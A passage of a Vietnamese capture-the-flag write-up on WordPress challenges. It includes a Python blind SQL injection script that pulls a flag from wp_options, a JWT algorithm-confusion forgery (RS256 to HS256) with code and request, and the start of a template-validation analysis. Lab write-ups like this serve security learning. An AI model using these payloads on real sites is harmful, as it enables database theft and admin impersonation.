các hàm số để so sánh. Tôi chuyển qua so sánh bằng số và sử dụng hàm <code>ASCII()</code> để chuyển đổi ký tự sang mã số, đồng thời sử dụng hàm <code>CHAR()</code> để lấy tên cột. Flag của challenge này nằm trong bảng <code>wp_options</code> với tên cột là <code>flag_links_data</code>.</p><p>Với sự hỗ trợ của ChatGPT, tôi đã viết một script để khai thác lỗ hổng này:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://100.25.255.51:9097/wp-admin/admin-ajax.php&#39;</span>
</span></span><span class=line><span class=cl><span class=n>target_table</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test_sqli</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;action&#39;</span><span class=p>:</span> <span class=s1>&#39;get_link_data&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;link_name&#39;</span><span class=p>:</span> <span class=s1>&#39;test&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;order&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;orderby&#39;</span><span class=p>:</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/x-www-form-urlencoded&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>result</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;success&#39;</span><span class=p>)</span> <span class=o>==</span> <span class=kc>False</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>ValueError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>brute_force_flag_links_data</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>flag_value</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>char_set</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>punctuation</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>found</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>,</span> <span class=mi>127</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;(SELECT (CASE WHEN (SELECT ASCII(SUBSTRING(option_value,</span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>flag_value</span><span class=p>)</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2>,1)) FROM wordpress.wp_options WHERE option_name=CHAR(102,108,97,103,95,108,105,110,107,115,95,100,97,116,97)) = </span><span class=si>{</span><span class=n>char</span><span class=si>}</span><span class=s2> THEN 1 ELSE 6096*(SELECT 6096 FROM information_schema.tables) END))&#34;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>test_sqli</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>flag_value</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Đã tìm thấy: </span><span class=si>{</span><span class=n>flag_value</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>found</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>found</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Giá trị flag_links_data là: </span><span class=si>{</span><span class=n>flag_value</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>brute_force_flag_links_data</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=justinwonkytokens>JustinWonkyTokens<a hidden class=anchor aria-hidden=true href=#justinwonkytokens>#</a></h1><p><img loading=lazy src=https://images.viblo.asia/d5f6ff9c-ff1d-4ba0-8093-9576c29e0e82.png alt=image.png></p><p>Đề bài cung cấp một plugin sử dụng JWT (JSON Web Token) để xác thực, và nhiệm vụ của chúng ta là lấy được JWT với <code>role=admin</code> để có được flag.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>simple_jwt_handler</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$flag</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;/flag.txt&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$privateKey</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;/jwt.key&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$publicKey</span> <span class=o>=</span> <span class=s>&lt;&lt;&lt;</span><span class=dl>EOD</span><span class=s>
</span></span></span><span class=line><span class=cl><span class=s>    -----BEGIN PUBLIC KEY-----
</span></span></span><span class=line><span class=cl><span class=s>    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqXfQ7ExnjmPJbSwuFoxw
</span></span></span><span class=line><span class=cl><span class=s>    3kuBeE716YM5uXirwUb0OWB5RfACAx9yulBQJorcQIUdeRf+YpkQU5U8h3jVyeqw
</span></span></span><span class=line><span class=cl><span class=s>    HzjOjNjM00CVFeogTnueHoose7Jcdi/K3NyYcFQINui7b6cGab8hMl6SgctwZu1l
</span></span></span><span class=line><span class=cl><span class=s>    G0bk0VcqgafWFqSfIYZYw57GYhMnfPe7OR0Cvv1HBCD2nWYilDp/Hq3WUkaMWGsG
</span></span></span><span class=line><span class=cl><span class=s>    UBMSNpC2C/3CzGOBV8tHWAUA8CFI99dHckMZCFJlKMWNQUQlTlF3WB1PnDNL4EPY
</span></span></span><span class=line><span class=cl><span class=s>    YC+8DqJDSLCvFwI+DeqXG4B/DIYdJyhEgMdZfAKSbMJtsanOVjBLJx4hrNS42RNU
</span></span></span><span class=line><span class=cl><span class=s>    dwIDAQAB
</span></span></span><span class=line><span class=cl><span class=s>    -----END PUBLIC KEY-----
</span></span></span><span class=line><span class=cl><span class=s>    </span><span class=dl>EOD</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$issuedAt</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DateTimeImmutable</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nv>$data</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;role&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;guest&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;iat&#34;</span> <span class=o>=&gt;</span> <span class=nv>$issuedAt</span><span class=o>-&gt;</span><span class=na>getTimestamp</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;nbf&#34;</span> <span class=o>=&gt;</span> <span class=nv>$issuedAt</span><span class=o>-&gt;</span><span class=na>getTimestamp</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;simple_jwt&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>setcookie</span><span class=p>(</span><span class=s1>&#39;simple_jwt&#39;</span><span class=p>,</span> <span class=nx>SimpleJWTHandler</span><span class=o>::</span><span class=na>encodeToken</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=nv>$privateKey</span><span class=p>,</span> <span class=s1>&#39;RS256&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s1>&#39;JWT has been set.&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$token</span> <span class=o>=</span> <span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;simple_jwt&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$decoded</span> <span class=o>=</span> <span class=nx>SimpleJWTHandler</span><span class=o>::</span><span class=na>decodeToken</span><span class=p>(</span><span class=nv>$token</span><span class=p>,</span> <span class=nv>$publicKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nv>$decoded</span><span class=o>-&gt;</span><span class=na>role</span> <span class=o>==</span> <span class=s1>&#39;admin&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s1>&#39;Success: &#39;</span> <span class=o>.</span> <span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nv>$decoded</span><span class=o>-&gt;</span><span class=na>role</span> <span class=o>==</span> <span class=s1>&#39;guest&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s1>&#39;Role is guest.&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>Exception</span> <span class=nv>$e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s1>&#39;Token verification failed.&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Khi gửi yêu cầu tới <code>wp-ajax.php</code> với <code>action=simple_jwt_handler</code>, nếu không có giá trị <code>$_COOKIE['simple_jwt']</code>, plugin sẽ trả về một JWT với <code>role=guest</code>, được mã hóa bằng thuật toán <code>RS256</code>. Do chúng ta không biết được <code>private.key</code>, nên việc chỉnh sửa JWT để chuyển từ <code>role=guest</code> sang <code>role=admin</code> là không khả thi.</p><p>Tiếp theo, hãy kiểm tra hàm <code>SimpleJWTHandler::decodeToken($token, $publicKey)</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>decodeToken</span><span class=p>(</span><span class=nv>$token</span><span class=p>,</span> <span class=nv>$key</span> <span class=o>=</span> <span class=k>null</span><span class=p>,</span> <span class=nv>$verify</span> <span class=o>=</span> <span class=k>true</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$segments</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=nv>$token</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>count</span><span class=p>(</span><span class=nv>$segments</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=nx>UnexpectedValueException</span><span class=p>(</span><span class=s1>&#39;Invalid token structure&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>list</span><span class=p>(</span><span class=nv>$header64</span><span class=p>,</span> <span class=nv>$payload64</span><span class=p>,</span> <span class=nv>$signature64</span><span class=p>)</span> <span class=o>=</span> <span class=nv>$segments</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$header</span> <span class=o>=</span> <span class=nx>self</span><span class=o>::</span><span class=na>jsonDecode</span><span class=p>(</span><span class=nx>self</span><span class=o>::</span><span class=na>urlSafeBase64Decode</span><span class=p>(</span><span class=nv>$header64</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$payload</span> <span class=o>=</span> <span class=nx>self</span><span class=o>::</span><span class=na>jsonDecode</span><span class=p>(</span><span class=nx>self</span><span class=o>::</span><span class=na>urlSafeBase64Decode</span><span class=p>(</span><span class=nv>$payload64</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$signature</span> <span class=o>=</span> <span class=nx>self</span><span class=o>::</span><span class=na>urlSafeBase64Decode</span><span class=p>(</span><span class=nv>$signature64</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$verify</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$header</span><span class=o>-&gt;</span><span class=na>alg</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=nx>DomainException</span><span class=p>(</span><span class=s1>&#39;Algorithm missing&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$key</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$header</span><span class=o>-&gt;</span><span class=na>kid</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$key</span> <span class=o>=</span> <span class=nv>$key</span><span class=p>[</span><span class=nv>$header</span><span class=o>-&gt;</span><span class=na>kid</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=nx>DomainException</span><span class=p>(</span><span class=s1>&#39;Key ID missing&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>self</span><span class=o>::</span><span class=na>verifySignature</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$header64</span><span class=s2>.</span><span class=si>$payload64</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nv>$signature</span><span class=p>,</span> <span class=nv>$key</span><span class=p>,</span> <span class=nv>$header</span><span class=o>-&gt;</span><span class=na>alg</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=nx>UnexpectedValueException</span><span class=p>(</span><span class=s1>&#39;Signature verification failed&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$payload</span><span class=o>-&gt;</span><span class=na>exp</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>time</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=nv>$payload</span><span class=o>-&gt;</span><span class=na>exp</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=nx>UnexpectedValueException</span><span class=p>(</span><span class=s1>&#39;Token expired&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$payload</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Chúng ta thấy rằng hàm <code>decodeToken</code> sử dụng <code>$token</code> và <code>$publicKey</code> để xác thực JWT. Tuy nhiên, có một lỗ hổng ở đây: thuật toán mã hóa JWT (<code>alg</code>) không được cố định mà được lấy từ header của JWT mà người dùng gửi vào. Điều này cho phép chúng ta thay đổi thuật toán mã hóa từ <code>RS256</code> sang <code>HS256</code>. Với <code>HS256</code>, JWT sẽ sử dụng <code>publicKey</code> của server làm khóa bí mật để mã hóa thay vì <code>privateKey</code>.</p><p>Điều này có nghĩa là chúng ta có thể giả mạo JWT với <code>role=admin</code> bằng cách sử dụng thuật toán <code>HS256</code> và ký lại JWT bằng <code>publicKey</code> mà server đã cung cấp.</p><p>Với lỗ hổng đã phát hiện, chúng ta chỉ cần chỉnh sửa một chút ở phần mã hóa JWT để có thể tạo ra một JWT với <code>role=admin</code>. Thay vì sử dụng thuật toán <code>RS256</code>, chúng ta sẽ chuyển sang sử dụng <code>HS256</code> và ký lại JWT bằng <code>publicKey</code> mà server đã cung cấp.</p><p>Dưới đây là đoạn code đã được chỉnh sửa:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$data</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;role&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;admin&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;iat&#34;</span> <span class=o>=&gt;</span> <span class=nv>$issuedAt</span><span class=o>-&gt;</span><span class=na>getTimestamp</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;nbf&#34;</span> <span class=o>=&gt;</span> <span class=nv>$issuedAt</span><span class=o>-&gt;</span><span class=na>getTimestamp</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;simple_jwt&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>setcookie</span><span class=p>(</span><span class=s1>&#39;simple_jwt&#39;</span><span class=p>,</span> <span class=nx>SimpleJWTHandler</span><span class=o>::</span><span class=na>encodeToken</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=nv>$publicKey</span><span class=p>,</span> <span class=s1>&#39;HS256&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;JWT has been set.&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Với đoạn mã này, chúng ta đã tạo được một JWT với <code>role=admin</code>, sử dụng thuật toán <code>HS256</code> và <code>publicKey</code> từ server để ký lại JWT. Sau khi có được JWT này từ môi trường local, chỉ cần gửi JWT lên server bằng cách đính kèm nó vào <code>Cookie</code>, và gửi một request tới server. Nếu token đã được chỉnh sửa đúng cách, server sẽ xác thực JWT với <code>role=admin</code> và trả về flag.</p><p>Cụ thể, sau khi có JWT, bạn chỉ cần POST nó lên server thông qua:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-ajax.php?action=simple_jwt_handler</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>simple_jwt=&lt;JWT đã chỉnh sửa&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>Vậy là bạn sẽ nhận được flag</p><h1 id=timberlake>Timberlake<a hidden class=anchor aria-hidden=true href=#timberlake>#</a></h1><p><img loading=lazy src=https://images.viblo.asia/15498c71-f7ec-4fea-ab71-8bc80c5d349a.png alt=image.png></p><p>Đề bài cung cấp một theme WordPress với file <code>index.php</code> được sử dụng để hiển thị nội dung trang. Ở phần này, điểm cần chú ý là tham số <code>page</code> được truyền qua URL, và sau đó nội dung được render thông qua <code>Timber::render($page, $context)</code>. Tuy nhiên, để có thể render file template thành công, tham số <code>page</code> phải qua hàm <code>validate($_REQUEST['page'])</code>. Dưới đây, tôi sẽ giải thích chi tiết hơn các bước xử lý và các cơ chế bảo vệ của đoạn mã này.</p><h3 id=giải-thích-chi-tiết-các-phần-quan-trọng>Giải thích chi tiết các phần quan trọng:<a hidden class=anchor aria-hidden=true href=#giải-thích-chi-tiết-các-phần-quan-trọng>#</a></h3><ol><li><p><strong>Cơ chế xác định template:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$page</span> <span class=o>=</span> <span class=s1>&#39;template-home.twig&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>validate</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$page</span> <span class=o>=</span> <span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>Trong đoạn này, biến <code>$page</code> sẽ nhận giá trị từ tham số <code>page</code> trong request nếu hàm <code>validate()</code> trả về true. Nếu không, mặc định template được sử dụng là <code>template-home.twig</code>. Điều này có nghĩa rằng để render một file khác, giá trị của tham số <code>page</code> phải thỏa mãn các điều kiện kiểm tra trong hàm <code>validate()</code>.</p></li><li><p><strong>Hàm <code>validate()</code>:</strong>
Đây là hàm kiểm tra quan trọng để đảm bảo file được truyền qua tham số <code>page</code> an toàn và hợp lệ. Các bước kiểm tra bao gồm:</p><ul><li><p><strong>Kiểm tra tên file:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$filename</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$filename</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$filename</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;.php&#39;</span><span class=p>,</span> <span class=s1>&#39;.htm&#39;</span><span class=p>,</span> <span class=s1>&#39;.html&#39;</span><span class=p>,</span> <span class=s1>&#39;.phtml&#39;</span><span class=p>,</span> <span class=s1>&#39;.xhtml&#39;</span><span class=p>)))</span> <span class=p>{</span>
